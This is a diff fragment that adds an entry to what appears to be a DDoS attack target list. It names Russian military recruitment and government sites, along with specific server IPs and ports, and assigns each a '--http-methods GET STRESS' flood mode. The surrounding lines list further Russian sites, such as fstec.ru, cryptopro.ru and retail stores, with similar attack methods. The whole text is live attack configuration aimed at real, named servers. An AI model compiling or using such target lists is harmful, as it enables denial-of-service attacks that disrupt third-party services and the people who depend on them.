@@ -24,6 +24,8 @@ tcp://185.165.123.40:80 tcp://185.165.123.40:443 tcp://178.248.238.208:80 tcp://
 
 #https://fstec.ru/ http://fstec.ru/ --http-methods CFB
 
+http://contract-army.ru https://www.voenkoma.net https://gogov.ru/mil http://5.101.152.200:80 http://45.130.41.19:80 http://45.130.41.19:443 https://45.130.41.19:443 http://95.213.199.232:443 https://95.213.199.232:443 http://95.213.199.232:1500 https://95.213.199.232:1500 tcp://5.101.152.200:80 tcp://45.130.41.19:80 tcp://45.130.41.19:443 tcp://95.213.199.232:80 tcp://95.213.199.232:443 tcp://95.213.199.232:1500 --http-methods GET STRESS
+
 https://www.cryptopro.ru/order/OrderForm.aspx?catid=c26ac260-7cfc-e811-870f-0025900a9ce7~ http://178.238.112.83:80 http://178.238.112.83:443 https://178.238.112.83:443 tcp://178.238.112.83:80 tcp://178.238.112.83:443 --http-methods GET POST
 
 https://www.babochka.ru/stores https://spb.aport.ru/odezhda_i_obuv/cat5645 https://spb.aport.ru http://139.45.250.90:80 https://139.45.250.90:443 tcp://139.45.250.90:80 tcp://139.45.250.90:443 tcp://139.45.250.90:8111 tcp://139.45.250.90:40443 tcp://23.111.103.204:22 tcp://23.111.103.204:80 tcp://23.111.103.204:123 tcp://23.111.103.204:443 --http-methods GET STRESS
